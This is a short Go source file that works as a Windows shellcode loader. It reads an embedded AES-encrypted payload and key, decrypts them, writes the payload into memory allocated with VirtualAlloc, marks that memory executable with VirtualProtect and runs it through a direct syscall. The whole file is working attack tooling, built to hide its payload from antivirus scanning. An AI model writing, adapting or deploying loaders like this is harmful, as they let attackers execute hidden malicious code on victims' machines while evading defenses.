package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	//go:embed "encrypted_sc"
	encryptedShellcode []byte

	//go:embed "key"
	key []byte
)

func checkErr(err error) {
	if err != nil {
		log.Panicf("Unexpected error encountered: %s", err)
	}
}

func decryptAES(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	checkErr(err)
	if len(data) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(data, data)
	return data, nil
}

// Credits to Joff Thyer for Direct Syscall Strategy: https://www.youtube.com/watch?v=gH9qyHVc9-M
func main() {
	sc, err := decryptAES(encryptedShellcode, key)
	checkErr(err)
	// syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	checkErr(err)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	checkErr(err)

	syscall.SyscallN(addr, 0, 0, 0, 0)
}
